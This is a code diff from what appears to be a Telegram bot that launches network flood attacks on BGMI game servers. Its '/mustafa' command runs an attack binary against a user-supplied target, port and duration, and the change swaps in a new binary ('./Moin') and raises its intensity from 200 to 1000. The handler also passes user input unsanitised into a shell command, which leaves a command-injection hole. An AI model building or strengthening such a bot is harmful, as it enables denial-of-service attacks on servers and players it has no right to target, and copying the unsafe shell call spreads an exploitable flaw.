@@ -146,7 +146,7 @@ def handle_bgmi(message):
                         response = "Error: Time interval must be less than or equal to 180."
                     else:
                         log_command(user_id, '/mustafa', target, port, time)
-                        subprocess.run(f"./bgmi {target} {port} {time} 200", shell=True)
+                        subprocess.run(f"./Moin {target} {port} {time} 1000", shell=True)
                         response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}s"
                 else:
                     response = "✅ Usage: /mustafa <target> <port> <time>"
